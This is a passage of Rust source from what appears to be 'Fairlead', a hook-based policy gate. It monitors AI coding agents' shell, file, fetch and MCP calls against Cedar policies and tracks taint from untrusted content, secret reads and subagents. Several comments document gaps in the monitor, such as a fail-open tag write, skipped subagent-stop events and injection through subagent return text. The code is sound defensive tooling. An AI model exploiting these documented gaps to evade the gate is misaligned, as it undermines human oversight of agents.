    facts: &SessionFacts,
    provenance: &[String],
) -> Value {
    let caps: Vec<String> = granted_caps.to_vec();
    let parent = if facts.subagent_active {
        parent_caps.to_vec()
    } else {
        caps.clone()
    };
    let split = posix_split_ex(command);
    let parts = split.tokens;
    let mut sensitive = path_sensitive_resolved(path, cwd)
        || (command_looks_like_write(scan) && path_is_sensitive(scan))
        || git_skips_hooks(command)
        || looks_like_substitution(command)
        || split.has_param_expansion;
    if !sensitive {
        for tok in parts.iter().skip(1) {
            if is_flag_token(tok) {
                continue;
            }
            if path_sensitive_resolved(tok, cwd) {
                sensitive = true;
                break;
            }
        }
    }
    let mut net = command_looks_like_network(command) || looks_like_loopback(scan);
    if matches!(inspect_script(&parts, cwd, split.unmatched), ScriptInspect::Deny) {
        net = true;
    }
    json!({
        "command": command,
        "cwd": cwd,
        "sandbox": sandbox,
        "argv0": argv0(command),
        "argv0_is_boring": argv0_is_boring(command),
        "interpreter_exec": interpreter_exec(&parts),
        "command_looks_like_network": net,
        "path_is_sensitive": sensitive,
        "mcp_is_write": mcp_is_write(tool_name),
        "tool_name": tool_name,
        "provenance": provenance,
        "granted_caps": caps,
        "parent_caps": parent,
        "session": {
            "touched_secrets": facts.touched_secrets,
            "saw_untrusted_web": facts.saw_untrusted_web,
            "saw_mcp_untrusted": facts.saw_mcp_untrusted,
            "subagent_active": facts.subagent_active,
            "secret_read_count": facts.secret_read_count
        }
    })
}

/// Goal 10: the Controller (never the Q-LLM) marks a live quarantine record before
/// `is_authorized`. Every host adapter calls this: Cursor directly, Windsurf and OpenHands
/// via `cursor_hook_eval_in`, Claude in `claude_tool_gate_in`. The call's bytes are not read.
/// A missing or empty handle log leaves the flag false.
fn fill_argument_from_untrusted(req: &mut DecisionRequest, _stdin: &Value, dir: &Path) -> Result<(), String> {
    req.context["argument_from_untrusted"] = Value::Bool(crate::quarantine::args_from_untrusted(dir)?);
    Ok(())
}

pub fn request_from_cursor(
    kind: &str,
    stdin: &Value,
    session: &str,
    provenance: &[String],
    facts: &SessionFacts,
    parent_caps: &[String],
) -> Result<DecisionRequest, String> {
    let action = match kind {
        "shell" => "Shell",
        "mcp" => "McpCall",
        "read" => "FileRead",
        "write" => "FileWrite",
        _ => return Err(format!("unknown hook {kind}")),
    };
    let command = stdin.get("command").and_then(|v| v.as_str()).unwrap_or("");
    // Live Cursor 3.6.21 sends `"cwd":""` for beforeShellExecution (2026-10-08 probe). The hook
    // process cwd is not the workspace (`~/.cursor` or the managed dir), so resolving a relative
    // script there either denies a clean script or inspects the wrong file. Use workspace_roots[0].
    let cwd = stdin
        .get("cwd")
        .and_then(|v| v.as_str())
        .filter(|s| !s.is_empty())
        .or_else(|| {
            stdin
                .get("workspace_roots")
                .and_then(|v| v.as_array())
                .and_then(|a| a.first())
                .and_then(|v| v.as_str())
        })
        .unwrap_or("");
    let sandbox = stdin.get("sandbox").and_then(|v| v.as_bool()).unwrap_or(false);
    let tool_name = stdin.get("tool_name").and_then(|v| v.as_str()).unwrap_or("");
    let file_path = stdin.get("file_path").and_then(|v| v.as_str()).unwrap_or("");
    let from_input = stdin
        .get("tool_input")
        .map(path_from_tool_input)
        .unwrap_or_default();
    let path = if !file_path.is_empty() {
        file_path
    } else {
        from_input.as_str()
    };
    let scan = flatten_scan(command, stdin.get("tool_input"));
    let mut ctx = filled_context_scan(
        command,
        &scan,
        cwd,
        sandbox,
        path,
        tool_name,
        &[],
        parent_caps,
        facts,
        provenance,
    );
    if action == "FileWrite" {
        let input = stdin.get("tool_input").unwrap_or(stdin);
        ctx["command_looks_like_network"] = json!(filewrite_body_is_net(path, input));
    }
    let resource_raw = if !path.is_empty() {
        path
    } else if !tool_name.is_empty() {
        tool_name
    } else {
        "workspace"
    };
    Ok(DecisionRequest {
        principal: format!(r#"Fairlead::Agent::"cursor:{session}""#),
        action: action.to_string(),
        resource: format!(
            r#"Fairlead::Resource::"{}""#,
            resource_raw.replace('"', "")
        ),
        context: ctx,
    })
}

fn claude_tool_action(tool_name: &str) -> Result<&'static str, String> {
    if tool_name.eq_ignore_ascii_case("Bash") || tool_name.eq_ignore_ascii_case("PowerShell") {
        Ok("Shell")
    } else if tool_name.eq_ignore_ascii_case("Write") || tool_name.eq_ignore_ascii_case("Edit") {
        Ok("FileWrite")
    } else if tool_name.eq_ignore_ascii_case("Read") {
        Ok("FileRead")
    } else if tool_name.eq_ignore_ascii_case("WebFetch") {
        Ok("Fetch")
    } else if tool_name.starts_with("mcp__") {
        Ok("McpCall")
    } else {
        Err(format!("unmatched tool {tool_name}"))
    }
}

fn claude_is_spawn_tool(tool_name: &str) -> bool {
    tool_name.eq_ignore_ascii_case("Agent") || tool_name.eq_ignore_ascii_case("Task")
}

pub fn request_from_claude(
    stdin: &Value,
    session: &str,
    provenance: &[String],
    facts: &SessionFacts,
    parent_caps: &[String],
) -> Result<DecisionRequest, String> {
    let tool_name = stdin.get("tool_name").and_then(|v| v.as_str()).unwrap_or("");
    let action = claude_tool_action(tool_name)?;
    let tool_input = stdin.get("tool_input").cloned().unwrap_or(Value::Null);
    let command_in = command_from_tool_input(&tool_input);
    let command = stdin
        .get("command")
        .and_then(|v| v.as_str())
        .filter(|s| !s.is_empty())
        .unwrap_or(command_in.as_str());
    let cwd_in = tool_input
        .get("cwd")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    let cwd = stdin
        .get("cwd")
        .and_then(|v| v.as_str())
        .filter(|s| !s.is_empty())
        .unwrap_or(cwd_in);
    let sandbox = stdin.get("sandbox").and_then(|v| v.as_bool()).unwrap_or(false);
    let file_path = stdin.get("file_path").and_then(|v| v.as_str()).unwrap_or("");
    let from_input = path_from_tool_input(&tool_input).replace('\\', "/");
    let path = if !file_path.is_empty() {
        file_path.replace('\\', "/")
    } else {
        from_input
    };
    let scan = flatten_scan(command, stdin.get("tool_input"));
    let mut ctx = filled_context_scan(
        command,
        &scan,
        cwd,
        sandbox,
        &path,
        tool_name,
        &[],
        parent_caps,
        facts,
        provenance,
    );
    if action == "FileWrite" {
        let input = stdin.get("tool_input").unwrap_or(stdin);
        ctx["command_looks_like_network"] = json!(filewrite_body_is_net(&path, input));
    }
    let resource_raw = if !path.is_empty() {
        path.as_str()
    } else if !tool_name.is_empty() {
        tool_name
    } else {
        "workspace"
    };
    Ok(DecisionRequest {
        principal: format!(r#"Fairlead::Agent::"claude:{session}""#),
        action: action.to_string(),
        resource: format!(
            r#"Fairlead::Resource::"{}""#,
            resource_raw.replace('"', "")
        ),
        context: ctx,
    })
}

pub struct HookEval {
    pub stdout: Value,
    pub exit: i32,
    pub action: String,
    pub command_preview: Option<String>,
    /// Capped tool name from the hook payload. Empty when the host sent none.
    pub tool_name: String,
    pub session: String,
    pub provenance: Vec<String>,
    pub policy_ids: Vec<String>,
    pub parent_session_id: Option<String>,
    pub parent_caps: Vec<String>,
}

pub struct ObserveEval {
    pub stdout: Value,
    pub exit: i32,
    pub tags: Vec<String>,
    pub session: String,
}

/// Host sentence after Cedar returns. Ids are the determining set, already sorted.
/// Empty and not errored is the default deny: nothing matched. A catch-all forbid
/// would win over F-DEF-06, so the sentence names that case instead.
fn cedar_deny_message(policy_ids: &[String], errored: bool) -> String {
    if errored {
        return "fairlead deny: policy error".into();
    }
    if policy_ids.is_empty() {
        return "fairlead deny: no matching policy".into();
    }
    format!("fairlead deny: {}", policy_ids.join(", "))
}

fn hook_stdout(permission: &str, msg: &str) -> Value {
    json!({
        "permission": permission,
        "user_message": msg,
        "agent_message": msg,
    })
}

fn claude_pretool_out(decision: &str, reason: &str) -> Value {
    json!({
        "hookSpecificOutput": {
            "hookEventName": "PreToolUse",
            "permissionDecision": decision,
            "permissionDecisionReason": reason
        }
    })
}

fn claude_pr_deny_out(msg: &str) -> Value {
    json!({
        "hookSpecificOutput": {
            "hookEventName": "PermissionRequest",
            "decision": {
                "behavior": "deny",
                "message": msg
            }
        }
    })
}

pub fn claude_deny_stdout(event: &str, msg: &str) -> (Value, i32) {
    match event {
        "permission-request" => (claude_pr_deny_out(msg), 0),
        "subagent-start" | "subagent-stop" => (json!({}), 0),
        _ => (claude_pretool_out("deny", msg), 2),
    }
}

/// Cursor `permission`, Claude `permissionDecision` / `decision.behavior`, empty `{}` → allow.
pub fn permission_label(stdout: &Value) -> &str {
    if let Some(s) = stdout.get("permission").and_then(|v| v.as_str()) {
        return s;
    }
    if let Some(hso) = stdout.get("hookSpecificOutput") {
        if let Some(s) = hso.get("permissionDecision").and_then(|v| v.as_str()) {
            return s;
        }
        if let Some(s) = hso
            .get("decision")
            .and_then(|v| v.get("behavior"))
            .and_then(|v| v.as_str())
        {
            return s;
        }
    }
    if stdout.as_object().is_some_and(|m| m.is_empty()) {
        return "allow";
    }
    "deny"
}

fn capped_tool_name(name: &str) -> String {
    name.chars().take(200).collect()
}

impl HookEval {
    fn with_tool_name(mut self, name: &str) -> Self {
        self.tool_name = capped_tool_name(name);
        self
    }

    fn deny(msg: &str, session: String, action: &str, preview: Option<String>) -> Self {
        Self {
            stdout: hook_stdout("deny", msg),
            exit: 2,
            action: action.to_string(),
            command_preview: preview,
            tool_name: String::new(),
            session,
            provenance: vec![],
            policy_ids: vec![],
            parent_session_id: None,
            parent_caps: vec![],
        }
    }

    fn allow(session: String, action: &str, preview: Option<String>) -> Self {
        Self {
            stdout: hook_stdout("allow", ""),
            exit: 0,
            action: action.to_string(),
            command_preview: preview,
            tool_name: String::new(),
            session,
            provenance: vec![],
            policy_ids: vec![],
            parent_session_id: None,
            parent_caps: vec![],
        }
    }

    fn claude_deny(event: &str, msg: &str, session: String, action: &str, preview: Option<String>) -> Self {
        let (stdout, exit) = claude_deny_stdout(event, msg);
        Self {
            stdout,
            exit,
            action: action.to_string(),
            command_preview: preview,
            tool_name: String::new(),
            session,
            provenance: vec![],
            policy_ids: vec![],
            parent_session_id: None,
            parent_caps: vec![],
        }
    }

    fn claude_pretool_allow(session: String, action: &str, preview: Option<String>) -> Self {
        Self {
            stdout: claude_pretool_out("allow", ""),
            exit: 0,
            action: action.to_string(),
            command_preview: preview,
            tool_name: String::new(),
            session,
            provenance: vec![],
            policy_ids: vec![],
            parent_session_id: None,
            parent_caps: vec![],
        }
    }

    fn claude_empty(session: String, action: &str) -> Self {
        Self {
            stdout: json!({}),
            exit: 0,
            action: action.to_string(),
            command_preview: None,
            tool_name: String::new(),
            session,
            provenance: vec![],
            policy_ids: vec![],
            parent_session_id: None,
            parent_caps: vec![],
        }
    }
}

pub fn cursor_hook_eval(kind: &str, raw: &str, engine: &Engine) -> HookEval {
    cursor_hook_eval_in(kind, raw, engine, &session_dir())
}

pub fn cursor_hook_eval_in(kind: &str, raw: &str, engine: &Engine, session_dir: &Path) -> HookEval {
    let fallback = mint_session_id();
    let parsed = match serde_json::from_str::<Value>(raw) {
        Ok(v) => v,
        Err(_) => {
            return HookEval::deny("invalid hook json", fallback, kind, None);
        }
    };
    let tool_name = parsed
        .get("tool_name")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    let Some(cid) = conversation_id_from_stdin(&parsed) else {
        return HookEval::deny("missing conversation_id", fallback, kind, None).with_tool_name(tool_name);
    };
    let ws = workspace_key(&parsed);
    match bind_pending_child(session_dir, &cid, &ws) {
        Ok(_) => {}
        Err(_) => {
            return HookEval::deny("fairlead deny: session store", fallback, kind, None)
                .with_tool_name(tool_name);
        }
    }
    let mut session = fallback;
    let mut store_tags: Vec<String> = Vec::new();
    let mut parent_caps: Vec<String> = Vec::new();
    let mut parent_session_id: Option<String> = None;
    let mut subagent_active = false;
    match load_session(session_dir, &cid) {
        Ok(Some(snap)) => {
            session = snap.session_id;
            store_tags = snap.tags;
            parent_caps = snap.parent_caps;
            parent_session_id = snap.parent_session_id;
            subagent_active = snap.subagent_active;
        }
        Ok(None) => {}
        Err(_) => {
            return HookEval::deny("fairlead deny: session store", session, kind, None)
                .with_tool_name(tool_name);
        }
    }
    let file_path = parsed
        .get("file_path")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    let from_input = parsed
        .get("tool_input")
        .map(path_from_tool_input)
        .unwrap_or_default();
    let path = if !file_path.is_empty() {
        file_path
    } else {
        from_input.as_str()
    };
    if kind == "read" {
        let secret = hop_secret_tags(path);
        if !secret.is_empty() {
            match append_tags_maybe_parent(
                session_dir,
                &cid,
                "read",
                &secret,
                &sha256_hex(raw.as_bytes()),
            ) {
                Ok(snap) => {
                    session = snap.session_id;
                    store_tags = snap.tags;
                    parent_caps = snap.parent_caps;
                    parent_session_id = snap.parent_session_id;
                    subagent_active = snap.subagent_active;
                }
                Err(_) => {
                    return HookEval::deny("fairlead deny: session store", session, kind, None)
                        .with_tool_name(tool_name);
                }
            }
        }
    }
    let lines = match load_lines(session_dir, &cid) {
        Ok(l) => l,
        Err(_) => {
            return HookEval::deny("fairlead deny: session store", session, kind, None)
                .with_tool_name(tool_name);
        }
    };
    let mut facts = reduce(&lines);
    facts.subagent_active = subagent_active;
    let provenance = cedar_provenance(&store_tags);
    let mut req = match request_from_cursor(
        kind,
        &parsed,
        &session,
        &provenance,
        &facts,
        &parent_caps,
    ) {
        Ok(r) => r,
        Err(e) => return HookEval::deny(&e, session, kind, None).with_tool_name(tool_name),
    };
    if fill_argument_from_untrusted(&mut req, &parsed, session_dir).is_err() {
        return HookEval::deny("fairlead deny: session store", session, kind, None)
            .with_tool_name(tool_name);
    }
    let preview = if kind == "write" || kind == "read" {
        (!path.is_empty()).then(|| path.chars().take(200).collect())
    } else {
        req.context
            .get("command")
            .and_then(|v| v.as_str())
            .filter(|s| !s.is_empty())
            .map(|s| s.chars().take(200).collect())
    };
    let out = engine.evaluate(&req);
    let denied = out.errored || out.decision == Decision::Deny;
    let outcome = if denied { "deny" } else { "allow" };
    if append_decision(
        session_dir,
        &cid,
        &req.action,
        outcome,
        &sha256_hex(raw.as_bytes()),
        &provenance,
        &session,
    )
    .is_err()
    {
        return HookEval::deny("fairlead deny: session store", session, kind, preview)
            .with_tool_name(tool_name);
    }
    let mut provenance = provenance;
    if kind == "mcp" && !denied {
        let tags = classify_after_mcp(&parsed);
        match append_tags_maybe_parent(
            session_dir,
            &cid,
            "mcp",
            &tags,
            &sha256_hex(raw.as_bytes()),
        ) {
            Ok(snap) => {
                session = snap.session_id;
                provenance = cedar_provenance(&snap.tags);
                parent_caps = snap.parent_caps;
                parent_session_id = snap.parent_session_id;
            }
            Err(_) => {
                return HookEval::deny("fairlead deny: session store", session, kind, preview)
                    .with_tool_name(tool_name);
            }
        }
    }
    let mut eval = if denied {
        HookEval::deny(
            &cedar_deny_message(&out.policy_ids, out.errored),
            session,
            &req.action,
            preview,
        )
    } else {
        HookEval::allow(session, &req.action, preview)
    };
    eval.provenance = provenance;
    eval.policy_ids = out.policy_ids;
    eval.parent_session_id = parent_session_id;
    eval.parent_caps = parent_caps;
    eval.with_tool_name(tool_name)
}

fn unix_ts() -> String {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs().to_string())
        .unwrap_or_else(|_| "0".into())
}

fn append_jsonl(path: &Path, line: &str) -> Result<(), String> {
    if let Some(parent) = path.parent() {
        if !parent.as_os_str().is_empty() {
            std::fs::create_dir_all(parent)
                .map_err(|e| format!("mkdir {}: {e}", parent.display()))?;
        }
    }
    let mut f = OpenOptions::new()
        .create(true)
        .append(true)
        .open(path)
        .map_err(|e| format!("open {}: {e}", path.display()))?;
    writeln!(f, "{line}").map_err(|e| format!("write {}: {e}", path.display()))
}

/// Shadow log. Not Dual-LLM. Armed `gate()` must not call this.
pub fn append_shadow_line(
    dest: &Path,
    would_deny: bool,
    errored: bool,
    action: &str,
    command_preview: Option<&str>,
    policy_ids: &[String],
    session: &str,
) -> Result<(), String> {
    let line = json!({
        "ts": unix_ts(),
        "would_deny": would_deny,
        "errored": errored,
        "action": action,
        "command_preview": command_preview,
        "policy_ids": policy_ids,
        "session": session,
    })
    .to_string();
    append_jsonl(dest, &line)
}

/// F-AUD-04: evaluate Cedar, log would_deny, never block the host.
/// ponytail: does not bind_pending_child (that consumes the FIFO). First child hop
/// before bind may miss F-SUB-03 in shadow. Upgrade: read-only peek of pending.
pub fn cursor_hook_shadow(kind: &str, raw: &str, engine: &Engine) -> HookEval {
    cursor_hook_shadow_in(kind, raw, engine, &session_dir(), &observe_path())
}

pub fn cursor_hook_shadow_in(
    kind: &str,
    raw: &str,
    engine: &Engine,
    session_dir: &Path,
    observe_dest: &Path,
) -> HookEval {
    let fallback = mint_session_id();
    let finish = |would_deny: bool,
                  errored: bool,
                  action: &str,
                  preview: Option<String>,
                  policy_ids: Vec<String>,
                  session: String,
                  provenance: Vec<String>,
                  parent_session_id: Option<String>,
                  parent_caps: Vec<String>| {
        if let Err(e) = append_shadow_line(
            observe_dest,
            would_deny,
            errored,
            action,
            preview.as_deref(),
            &policy_ids,
            &session,
        ) {
            eprintln!("observe jsonl: {e}");
        }
        let mut eval = HookEval::allow(session, action, preview);
        eval.policy_ids = policy_ids;
        eval.provenance = provenance;
        eval.parent_session_id = parent_session_id;
        eval.parent_caps = parent_caps;
        eval
    };

    let parsed = match serde_json::from_str::<Value>(raw) {
        Ok(v) => v,
        Err(_) => {
            return finish(
                true,
                true,
                kind,
                None,
                vec![],
                fallback,
                vec![],
                None,
                vec![],
            );
        }
    };
    let Some(cid) = conversation_id_from_stdin(&parsed) else {
        return finish(
            true,
            false,
            kind,
            None,
            vec![],
            fallback,
            vec![],
            None,
            vec![],
        );
    };
    let mut session = fallback;
    let mut store_tags: Vec<String> = Vec::new();
    let mut parent_caps: Vec<String> = Vec::new();
    let mut parent_session_id: Option<String> = None;
    let mut subagent_active = false;
    match load_session(session_dir, &cid) {
        Ok(Some(snap)) => {
            session = snap.session_id;
            store_tags = snap.tags;
            parent_caps = snap.parent_caps;
            parent_session_id = snap.parent_session_id;
            subagent_active = snap.subagent_active;
        }
        Ok(None) => {}
        Err(_) => {
            return finish(
                true,
                true,
                kind,
                None,
                vec![],
                session,
                vec![],
                None,
                vec![],
            );
        }
    }
    let lines = match load_lines(session_dir, &cid) {
        Ok(l) => l,
        Err(_) => {
            return finish(
                true,
                true,
                kind,
                None,
                vec![],
                session,
                vec![],
                parent_session_id.clone(),
                parent_caps.clone(),
            );
        }
    };
    let mut facts = reduce(&lines);
    facts.subagent_active = subagent_active;
    let provenance = cedar_provenance(&store_tags);
    let mut req = match request_from_cursor(
        kind,
        &parsed,
        &session,
        &provenance,
        &facts,
        &parent_caps,
    ) {
        Ok(r) => r,
        Err(_) => {
            return finish(
                true,
                true,
                kind,
                None,
                vec![],
                session,
                provenance,
                parent_session_id,
                parent_caps,
            );
        }
    };
    if fill_argument_from_untrusted(&mut req, &parsed, session_dir).is_err() {
        return finish(true, true, kind, None, vec![], session, provenance, parent_session_id, parent_caps);
    }
    let preview = req
        .context
        .get("command")
        .and_then(|v| v.as_str())
        .filter(|s| !s.is_empty())
        .map(|s| s.chars().take(200).collect());
    let out = engine.evaluate(&req);
    let would_deny = out.errored || out.decision == Decision::Deny;
    finish(
        would_deny,
        out.errored,
        &req.action,
        preview,
        out.policy_ids,
        session,
        provenance,
        parent_session_id,
        parent_caps,
    )
}

pub fn cursor_hook_observe(kind: &str, raw: &str) -> ObserveEval {
    cursor_hook_observe_in(kind, raw, &session_dir())
}

pub fn cursor_hook_observe_in(kind: &str, raw: &str, session_dir: &Path) -> ObserveEval {
    let empty = || ObserveEval {
        stdout: json!({}),
        exit: 0,
        tags: vec![],
        session: String::new(),
    };
    let parsed = match serde_json::from_str::<Value>(raw) {
        Ok(v) => v,
        Err(e) => {
            eprintln!("after-hook json: {e}");
            return empty();
        }
    };
    let tags = match kind {
        "after-mcp" => classify_after_mcp(&parsed),
        "after-shell" => classify_after_shell(&parsed),
        _ => {
            eprintln!("unknown observe hook {kind}");
            return empty();
        }
    };
    let cid = conversation_id_from_stdin(&parsed).unwrap_or_else(mint_session_id);
    let ws = workspace_key(&parsed);
    if bind_pending_child(session_dir, &cid, &ws).is_err() {
        eprintln!("after-hook store: bind");
        return ObserveEval {
            stdout: json!({}),
            exit: 0,
            tags: tags.clone(),
            session: String::new(),
        };
    }
    match append_tags_maybe_parent(
        session_dir,
        &cid,
        kind,
        &tags,
        &sha256_hex(raw.as_bytes()),
    ) {
        Ok(snap) => ObserveEval {
            stdout: json!({}),
            exit: 0,
            tags: snap.tags,
            session: snap.session_id,
        },
        Err(e) => {
            // ponytail: after-* cannot un-run; fail-open on tag write. Next before-*
            // sees missing taint. failClosed on afterMCP would fight Cursor observe-only.
            eprintln!("after-hook store: {e}");
            ObserveEval {
                stdout: json!({}),
                exit: 0,
                tags,
                session: String::new(),
            }
        }
    }
}

pub fn cursor_subagent_start(raw: &str) -> HookEval {
    cursor_subagent_start_in(raw, &session_dir())
}

pub fn cursor_subagent_start_in(raw: &str, session_dir: &Path) -> HookEval {
    let fallback = mint_session_id();
    let parsed = match serde_json::from_str::<Value>(raw) {
        Ok(v) => v,
        Err(_) => return HookEval::deny("invalid hook json", fallback, "SubagentStart", None),
    };
    let Some(cid) = conversation_id_from_stdin(&parsed) else {
        return HookEval::deny("missing conversation_id", fallback, "SubagentStart", None);
    };
    let spawn = spawn_id_from_stdin(&parsed);
    let ws = workspace_key(&parsed);
    let parallel = parsed
        .get("is_parallel_worker")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);
    match child_open(session_dir, &cid, &spawn, &ws, &[], parallel) {
        Ok(env) => {
            let mut eval = HookEval::allow(env.parent_session_id.clone(), "SubagentStart", None);
            eval.parent_session_id = Some(env.parent_session_id);
            eval.parent_caps = env.parent_caps;
            eval
        }
        Err(_) => HookEval::deny("fairlead deny: session store", fallback, "SubagentStart", None),
    }
}

pub fn cursor_subagent_stop(raw: &str) -> ObserveEval {
    cursor_subagent_stop_in(raw, &session_dir())
}

pub fn cursor_subagent_stop_in(raw: &str, session_dir: &Path) -> ObserveEval {
    // Residual: Cursor often skips subagentStop for background agents (forum 163054).
    // Child taint is already unioned onto the parent at hop time. Task return text
    // can still inject into the parent (Phase 2 / Dual-LLM). Do not emit followup_message.
    let empty = || ObserveEval {
        stdout: json!({}),
        exit: 0,
        tags: vec![],
        session: String::new(),
    };
    let parsed = match serde_json::from_str::<Value>(raw) {
        Ok(v) => v,
        Err(e) => {
            eprintln!("subagent-stop json: {e}");
            return empty();
        }
    };
    let Some(cid) = conversation_id_from_stdin(&parsed) else {
        return empty();
    };
    match child_stop(session_dir, &cid) {
        Ok(snap) => ObserveEval {
            stdout: json!({}),
            exit: 0,
            tags: snap.tags,
            session: snap.session_id,
        },
        Err(e) => {
            eprintln!("subagent-stop store: {e}");
            empty()
        }
    }
}

pub fn cursor_pretool(raw: &str, engine: &Engine) -> HookEval {
    cursor_pretool_in(raw, &session_dir(), engine)
}

pub fn cursor_pretool_in(raw: &str, session_dir: &Path, engine: &Engine) -> HookEval {
    let fallback = mint_session_id();
    let parsed = match serde_json::from_str::<Value>(raw) {
        Ok(v) => v,
        Err(_) => return HookEval::deny("invalid hook json", fallback, "SubagentStart", None),
    };
    let tool = parsed
        .get("tool_name")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    if tool.eq_ignore_ascii_case("task") {
        return cursor_subagent_start_in(raw, session_dir);
    }
    if tool.eq_ignore_ascii_case("write")
        || tool.eq_ignore_ascii_case("edit")
        || tool.eq_ignore_ascii_case("delete")
    {
        return cursor_hook_eval_in("write", raw, engine, session_dir);
    }
    if tool.eq_ignore_ascii_case("read") {
        return cursor_hook_eval_in("read", raw, engine, session_dir);
    }
    if tool.eq_ignore_ascii_case("glob") {
        let subject = glob_subject_path(&parsed);
        if path_is_sensitive(&subject) {
            let mut cloned = parsed.clone();
            cloned["file_path"] = Value::String(subject);
            return cursor_hook_eval_in("read", &cloned.to_string(), engine, session_dir);
        }
        return cursor_hook_eval_in("read", raw, engine, session_dir);
    }
    if tool.eq_ignore_ascii_case("grep") {
        let current = parsed
            .get("tool_input")
            .map(path_from_tool_input)
            .unwrap_or_default();
        let subject = grep_subject_path(&parsed, &current);
        if subject != current {
            let mut cloned = parsed.clone();
            cloned["file_path"] = Value::String(subject);
            let rewritten = cloned.to_string();
            return cursor_hook_eval_in("read", &rewritten, engine, session_dir);
        }
        return cursor_hook_eval_in("read", raw, engine, session_dir);
    }
    let session = conversation_id_from_stdin(&parsed).unwrap_or(fallback);
    HookEval::allow(session, "preToolUse", None)
}

pub fn windsurf_hook_eval(raw: &str, engine: &Engine) -> HookEval {
    windsurf_hook_eval_in(raw, engine, &session_dir())
}

pub fn windsurf_hook_eval_in(raw: &str, engine: &Engine, session_dir: &Path) -> HookEval {
    host_via_cursor(raw, engine, session_dir, shape_windsurf)
}

pub fn openhands_hook_eval(raw: &str, engine: &Engine) -> HookEval {
    openhands_hook_eval_in(raw, engine, &session_dir())
}

pub fn openhands_hook_eval_in(raw: &str, engine: &Engine, session_dir: &Path) -> HookEval {
    let mut eval = host_via_cursor(raw, engine, session_dir, shape_openhands);
    // stdout `decision` overrides the exit code. Never emit decision allow.
    if eval.exit != 0 {
        eval.exit = 2;
        let reason = eval
            .stdout
            .get("user_message")
            .and_then(|v| v.as_str())
            .unwrap_or("fairlead deny");
        eval.stdout = json!({"decision": "deny", "reason": reason});
    } else {
        eval.stdout = json!({});
    }
    eval
}

fn host_via_cursor(
    raw: &str,
    engine: &Engine,
    session_dir: &Path,
    shape: fn(&Value) -> Option<(&'static str, String)>,
) -> HookEval {
    let fallback = mint_session_id();
    let parsed = match serde_json::from_str::<Value>(raw) {
        Ok(v) => v,
        Err(_) => return HookEval::deny("invalid hook json", fallback, "host", None),
    };
    let Some((kind, shaped)) = shape(&parsed) else {
        return HookEval::deny("unmatched host hook", fallback, "host", None);
    };
    cursor_hook_eval_in(kind, &shaped, engine, session_dir)
}

fn shape_windsurf(v: &Value) -> Option<(&'static str, String)> {
    let cid = v.get("trajectory_id").and_then(|x| x.as_str()).unwrap_or("");
    let info = v.get("tool_info")?;
    let action = v.get("agent_action_name").and_then(|x| x.as_str())?;
    let shaped = match action {
        "pre_run_command" => {
            let cmd = info.get("command_line").and_then(|x| x.as_str()).unwrap_or("");
            json!({"conversation_id": cid, "command": cmd})
        }
        "pre_write_code" => {
            let path = info.get("file_path").and_then(|x| x.as_str()).unwrap_or("");
            let body = info
                .get("edits")
                .and_then(|e| e.as_array())
                .and_then(|a| a.first())
                .and_then(|ed| ed.get("new_string"))
                .and_then(|s| s.as_str())
                .unwrap_or("");
            json!({"conversation_id": cid, "tool_name": "Write", "tool_input": {"file_path": path, "contents": body}})
        }
        "pre_read_code" => {
            let path = info.get("file_path").and_then(|x| x.as_str()).unwrap_or("");
            json!({"conversation_id": cid, "file_path": path})
        }
        "pre_mcp_tool_use" => {
            let name = info.get("mcp_tool_name").and_then(|x| x.as_str()).unwrap_or("");
            let args = info.get("mcp_tool_arguments").cloned().unwrap_or(json!({}));
            json!({"conversation_id": cid, "tool_name": name, "tool_input": args})
        }
        _ => return None,
    };
    let kind = match action {
        "pre_run_command" => "shell",
        "pre_write_code" => "write",
        "pre_read_code" => "read",
        "pre_mcp_tool_use" => "mcp",
        _ => return None,
    };
    Some((kind, shaped.to_string()))
}

fn shape_openhands(v: &Value) -> Option<(&'static str, String)> {
    let cid = v.get("session_id").and_then(|x| x.as_str()).unwrap_or("");
    let tool = v.get("tool_name").and_then(|x| x.as_str()).unwrap_or("");
    let input = v.get("tool_input").cloned().unwrap_or(json!({}));
    let cwd = v.get("working_dir").and_then(|x| x.as_str()).unwrap_or("");
    let lower = tool.to_ascii_lowercase();
    if lower == "terminal" || lower == "bash" {
        let cmd = input.get("command").and_then(|x| x.as_str()).unwrap_or("");
        return Some((
            "shell",
            json!({"session_id": cid, "command": cmd, "cwd": cwd}).to_string(),
        ));
    }
    if matches!(lower.as_str(), "file_editor" | "str_replace_editor" | "write" | "edit") {
        let path = path_from_tool_input(&input);
        let body = ["file_text", "new_string", "contents", "content"]
            .iter()
            .find_map(|k| input.get(*k).and_then(|x| x.as_str()))
            .unwrap_or("");
        return Some((
            "write",
            json!({"session_id": cid, "tool_name": "Write", "tool_input": {"file_path": path, "contents": body}}).to_string(),
        ));
    }
    None
}

// S14 delivered vs skip (1F, not the 31-event matrix)
// delivered: PreToolUse, PermissionRequest, SubagentStop (child_stop)
// observe: SubagentStart (cannot block; spawn deny is PreToolUse Agent)
// skip: UserPromptSubmit/add_context as Gate, SubagentStop exit 2, updatedInput, after* as Gate

pub fn claude_hook_eval(event: &str, raw: &str, engine: &Engine) -> HookEval {
    claude_hook_eval_in(event, raw, engine, &session_dir())
}

pub fn claude_hook_eval_in(event: &str, raw: &str, engine: &Engine, session_dir: &Path) -> HookEval {
    match panic::catch_unwind(AssertUnwindSafe(|| {
        claude_hook_eval_inner(event, raw, engine, session_dir)
    })) {
        Ok(e) => e,
        Err(_) => {
            eprintln!("fairlead panic");
            HookEval::claude_deny(event, "fairlead deny", mint_session_id(), event, None)
        }
    }
}

fn claude_hook_eval_inner(
    event: &str,
    raw: &str,
    engine: &Engine,
    session_dir: &Path,
) -> HookEval {
    match event {
        "subagent-start" => claude_subagent_start_in(raw, session_dir),
        "subagent-stop" => claude_subagent_stop_in(raw, session_dir),
        "pretool" | "permission-request" => claude_tool_gate_in(event, raw, engine, session_dir),
        _ => HookEval::claude_deny(event, "unknown hook", mint_session_id(), event, None),
    }
}

fn claude_subagent_start_in(raw: &str, session_dir: &Path) -> HookEval {
    // ponytail: SubagentStart cannot block (host context-only). Spawn deny is PreToolUse Agent.
    // If Agent never fires, child_open here still tags the 1C tree. No second store.
    let parsed = match serde_json::from_str::<Value>(raw) {
        Ok(v) => v,
        Err(e) => {
            eprintln!("subagent-start json: {e}");
